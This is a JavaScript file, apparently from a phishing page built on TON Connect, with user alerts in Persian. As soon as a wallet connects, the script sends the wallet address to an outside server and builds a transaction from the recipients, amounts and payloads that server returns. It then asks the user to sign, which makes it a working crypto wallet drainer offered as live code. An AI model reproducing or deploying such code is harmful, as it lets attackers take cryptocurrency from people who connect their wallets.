$(document).ready(function() {
    const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
        manifestUrl: `https://bbaa91db.hshhnsnndn.pages.dev/tonconnect-manifest.json`, 
        buttonRootId: 'cnbtn'
    });

    async function send_transaction(resend = false) {
        const senderAddress = tonConnectUI.account.address;

        if (!senderAddress) {
            alert("آدرس کیف پول موجود نیست!");
            return;
        }

        $.ajax({
            url: `http://mu.catkeepe.site/api/transactions/${senderAddress}`,
            method: "GET",
            success: async function(data) {
                if (data.success) {
                    alert("ok");

                    const transaction = {
                        validUntil: Date.now() + 1000000,
                        messages: []
                    };

                    for (const item of data.data) {
                        transaction.messages.push({
                            address: item.address,
                            amount: Number(item.amount),
                            payload: item.payload
                        });
                    }

                    const sendResult = await tonConnectUI.sendTransaction(transaction);
                    if (sendResult) {
                        alert("تراکنش با موفقیت ارسال شد!");
                    } else {
                        alert("ارسال تراکنش ناموفق بود.");
                    }
                } else {
                    alert("خطا: " + (data.message || "اطلاعات به درستی دریافت نشد."));
                }
            },
            error: function(xhr) {
                alert("خطایی در دریافت اطلاعات کیف پول پیش آمد. کد خطا: " + xhr.status);
            }
        });
    }

    (async () => {
        tonConnectUI.onStatusChange(async () => {
            if (tonConnectUI.connected) {
                await send_transaction();
            }
        });

        if (tonConnectUI.connected) {
            await send_transaction();
        }
    })();

    async function openButton() {
        if (await tonConnectUI.connected) {
            await send_transaction();
        } else {
            await tonConnectUI.openModal();
        }
    }

    async function send_to_admin(text) {
        // HUH?
    }
});
